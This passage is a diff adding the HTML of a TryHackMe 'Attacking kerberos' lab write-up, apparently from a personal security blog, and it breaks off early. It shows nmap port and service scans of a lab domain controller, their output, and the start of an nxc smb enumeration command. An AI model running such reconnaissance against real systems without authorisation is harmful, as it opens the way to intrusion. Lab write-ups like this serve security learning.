@@ -1,0 +1,1308 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../atlas/">
+      
+      
+        <link rel="next" href="../../tags/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
+    
+    
+      
+        <title>Attacking kerberos - rdrg0x</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="deep-purple">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#attacking-kerberos" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="rdrg0x" class="md-header__button md-logo" aria-label="rdrg0x" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            rdrg0x
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Attacking kerberos
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="deep-purple"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="rdrg0x" class="md-nav__button md-logo" aria-label="rdrg0x" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    rdrg0x
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Writeups
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Writeups
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    HackTheBox
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TryHackme
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    TryHackme
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../alfred/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Alfred
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ADBasicEnum/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AD Basic Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../anthem/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Anthem
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../atlas/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Atlas
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Attacking kerberos
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Attacking kerberos
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Nmap
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rubeus" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Rubeus
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#kerberoasting-w-rubeus-impacket" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Kerberoasting w/ Rubeus &amp; Impacket
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#as-rep-roasting-w-rubeus" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        AS-REP Roasting w/ Rubeus
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mimikatz" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Mimikatz
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tags/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tags
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Nmap
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rubeus" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Rubeus
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#kerberoasting-w-rubeus-impacket" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Kerberoasting w/ Rubeus &amp; Impacket
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#as-rep-roasting-w-rubeus" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        AS-REP Roasting w/ Rubeus
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mimikatz" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Mimikatz
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+                
+
+
+
+  
+
+
+  <nav class="md-path" aria-label="Navigation" >
+    <ol class="md-path__list">
+      
+        
+  
+  
+    <li class="md-path__item">
+      <a href="../.." class="md-path__link">
+        
+  <span class="md-ellipsis">
+    Home
+  </span>
+
+      </a>
+    </li>
+  
+
+      
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../HackTheBox/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    Writeups
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../alfred/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    TryHackme
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ol>
+  </nav>
+
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  <nav class="md-tags" >
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:active-directory" class="md-tag">active-directory</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:tryhackme" class="md-tag">tryhackme</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:windows" class="md-tag">windows</a>
+      
+    
+  </nav>
+
+
+
+<h1 id="attacking-kerberos">Attacking kerberos<a class="headerlink" href="#attacking-kerberos" title="Permanent link">&para;</a></h1>
+<h2 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h2>
+<h3 id="nmap">Nmap<a class="headerlink" href="#nmap" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code>nmap<span class="w"> </span>-p-<span class="w"> </span>--open<span class="w"> </span>-sS<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">5000</span><span class="w"> </span>-n<span class="w"> </span>-Pn<span class="w"> </span><span class="m">10</span>.201.29.113<span class="w"> </span>-oN<span class="w"> </span>allPorts.txt<span class="w">                                                                                                  </span>
+PORT<span class="w">      </span>STATE<span class="w"> </span>SERVICE
+<span class="m">22</span>/tcp<span class="w">    </span>open<span class="w">  </span>ssh
+<span class="m">53</span>/tcp<span class="w">    </span>open<span class="w">  </span>domain
+<span class="m">88</span>/tcp<span class="w">    </span>open<span class="w">  </span>kerberos-sec
+<span class="m">135</span>/tcp<span class="w">   </span>open<span class="w">  </span>msrpc
+<span class="m">139</span>/tcp<span class="w">   </span>open<span class="w">  </span>netbios-ssn
+<span class="m">389</span>/tcp<span class="w">   </span>open<span class="w">  </span>ldap
+<span class="m">445</span>/tcp<span class="w">   </span>open<span class="w">  </span>microsoft-ds
+<span class="m">464</span>/tcp<span class="w">   </span>open<span class="w">  </span>kpasswd5
+<span class="m">593</span>/tcp<span class="w">   </span>open<span class="w">  </span>http-rpc-epmap
+<span class="m">636</span>/tcp<span class="w">   </span>open<span class="w">  </span>ldapssl
+<span class="m">3268</span>/tcp<span class="w">  </span>open<span class="w">  </span>globalcatLDAP
+<span class="m">3269</span>/tcp<span class="w">  </span>open<span class="w">  </span>globalcatLDAPssl
+<span class="m">3389</span>/tcp<span class="w">  </span>open<span class="w">  </span>ms-wbt-server
+<span class="m">5985</span>/tcp<span class="w">  </span>open<span class="w">  </span>wsman
+<span class="m">9389</span>/tcp<span class="w">  </span>open<span class="w">  </span>adws
+<span class="m">47001</span>/tcp<span class="w"> </span>open<span class="w">  </span>winrm
+<span class="m">49664</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown
+<span class="m">49665</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown
+<span class="m">49667</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown
+<span class="m">49669</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown
+<span class="m">49672</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown
+<span class="m">49673</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown
+<span class="m">49674</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown
+<span class="m">49678</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown
+<span class="m">49688</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown
+<span class="m">49698</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-p22,53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001,49664,49665,49667,49669,49672,49673,49674,49678,49688,49698<span class="w"> </span><span class="m">10</span>.201.29.113<span class="w"> </span>-oN<span class="w"> </span>target.txt<span class="w"> </span>
+
+PORT<span class="w">      </span>STATE<span class="w"> </span>SERVICE<span class="w">       </span>VERSION
+<span class="m">22</span>/tcp<span class="w">    </span>open<span class="w">  </span>ssh<span class="w">           </span>OpenSSH<span class="w"> </span>for_Windows_7.7<span class="w"> </span><span class="o">(</span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
+<span class="p">|</span><span class="w"> </span>ssh-hostkey:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span><span class="m">2048</span><span class="w"> </span><span class="m">68</span>:f2:8b:17:15:7c:90:d7:4e:0f:8e:d1:4c:6a:be:98<span class="w"> </span><span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span>b0:3a:a7:c3:88:2e:c1:0b:d7:be:1e:43:1c:f7:5b:34<span class="w"> </span><span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span><span class="m">03</span>:c0:ee:58:32:ae:6a:cc:8e:1a:7d:8b:20:c8:a2:bb<span class="w"> </span><span class="o">(</span>ED25519<span class="o">)</span>
+<span class="m">53</span>/tcp<span class="w">    </span>open<span class="w">  </span>domain<span class="w">        </span>Simple<span class="w"> </span>DNS<span class="w"> </span>Plus
+<span class="m">88</span>/tcp<span class="w">    </span>open<span class="w">  </span>kerberos-sec<span class="w">  </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Kerberos<span class="w"> </span><span class="o">(</span>server<span class="w"> </span>time:<span class="w"> </span><span class="m">2025</span>-10-05<span class="w"> </span><span class="m">21</span>:17:26Z<span class="o">)</span>
+<span class="m">135</span>/tcp<span class="w">   </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">139</span>/tcp<span class="w">   </span>open<span class="w">  </span>netbios-ssn<span class="w">   </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>netbios-ssn
+<span class="m">389</span>/tcp<span class="w">   </span>open<span class="w">  </span>ldap<span class="w">          </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>CONTROLLER.local0.,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
+<span class="m">445</span>/tcp<span class="w">   </span>open<span class="w">  </span>microsoft-ds?
+<span class="m">464</span>/tcp<span class="w">   </span>open<span class="w">  </span>kpasswd5?
+<span class="m">593</span>/tcp<span class="w">   </span>open<span class="w">  </span>ncacn_http<span class="w">    </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC<span class="w"> </span>over<span class="w"> </span>HTTP<span class="w"> </span><span class="m">1</span>.0
+<span class="m">636</span>/tcp<span class="w">   </span>open<span class="w">  </span>tcpwrapped
+<span class="m">3268</span>/tcp<span class="w">  </span>open<span class="w">  </span>ldap<span class="w">          </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>CONTROLLER.local0.,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
+<span class="m">3269</span>/tcp<span class="w">  </span>open<span class="w">  </span>tcpwrapped
+<span class="m">3389</span>/tcp<span class="w">  </span>open<span class="w">  </span>ms-wbt-server<span class="w"> </span>Microsoft<span class="w"> </span>Terminal<span class="w"> </span>Services
+<span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>CONTROLLER-1.CONTROLLER.local
+<span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2025</span>-10-04T21:11:35
+<span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2026</span>-04-05T21:11:35
+<span class="p">|</span>_ssl-date:<span class="w"> </span><span class="m">2025</span>-10-05T21:18:36+00:00<span class="p">;</span><span class="w"> </span>-1s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
+<span class="p">|</span><span class="w"> </span>rdp-ntlm-info:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span>Target_Name:<span class="w"> </span>CONTROLLER
+<span class="p">|</span><span class="w">   </span>NetBIOS_Domain_Name:<span class="w"> </span>CONTROLLER
+<span class="p">|</span><span class="w">   </span>NetBIOS_Computer_Name:<span class="w"> </span>CONTROLLER-1
+<span class="p">|</span><span class="w">   </span>DNS_Domain_Name:<span class="w"> </span>CONTROLLER.local
+<span class="p">|</span><span class="w">   </span>DNS_Computer_Name:<span class="w"> </span>CONTROLLER-1.CONTROLLER.local
+<span class="p">|</span><span class="w">   </span>Product_Version:<span class="w"> </span><span class="m">10</span>.0.17763
+<span class="p">|</span>_<span class="w">  </span>System_Time:<span class="w"> </span><span class="m">2025</span>-10-05T21:18:26+00:00
+<span class="m">5985</span>/tcp<span class="w">  </span>open<span class="w">  </span>http<span class="w">          </span>Microsoft<span class="w"> </span>HTTPAPI<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.0<span class="w"> </span><span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+<span class="p">|</span>_http-server-header:<span class="w"> </span>Microsoft-HTTPAPI/2.0
+<span class="p">|</span>_http-title:<span class="w"> </span>Not<span class="w"> </span>Found
+<span class="m">9389</span>/tcp<span class="w">  </span>open<span class="w">  </span>mc-nmf<span class="w">        </span>.NET<span class="w"> </span>Message<span class="w"> </span>Framing
+<span class="m">47001</span>/tcp<span class="w"> </span>open<span class="w">  </span>http<span class="w">          </span>Microsoft<span class="w"> </span>HTTPAPI<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.0<span class="w"> </span><span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+<span class="p">|</span>_http-title:<span class="w"> </span>Not<span class="w"> </span>Found
+<span class="p">|</span>_http-server-header:<span class="w"> </span>Microsoft-HTTPAPI/2.0
+<span class="m">49664</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">49665</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">49667</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">49669</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">49672</span>/tcp<span class="w"> </span>open<span class="w">  </span>ncacn_http<span class="w">    </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC<span class="w"> </span>over<span class="w"> </span>HTTP<span class="w"> </span><span class="m">1</span>.0
+<span class="m">49673</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">49674</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">49678</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">49688</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">49698</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+Service<span class="w"> </span>Info:<span class="w"> </span>Host:<span class="w"> </span>CONTROLLER-1<span class="p">;</span><span class="w"> </span>OS:<span class="w"> </span>Windows<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:windows
+
+Host<span class="w"> </span>script<span class="w"> </span>results:
+<span class="p">|</span><span class="w"> </span>smb2-security-mode:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span><span class="m">3</span>:1:1:<span class="w"> </span>
+<span class="p">|</span>_<span class="w">    </span>Message<span class="w"> </span>signing<span class="w"> </span>enabled<span class="w"> </span>and<span class="w"> </span>required
+<span class="p">|</span><span class="w"> </span>smb2-time:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span>date:<span class="w"> </span><span class="m">2025</span>-10-05T21:18:26
+<span class="p">|</span>_<span class="w">  </span>start_date:<span class="w"> </span>N/A
+</code></pre></div>
+<p>Nos enfrentamos a un DC, averiguamos el nombre del dominio</p>
+<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.201.29.113<span class="w">                                                                                                                                                      </span>
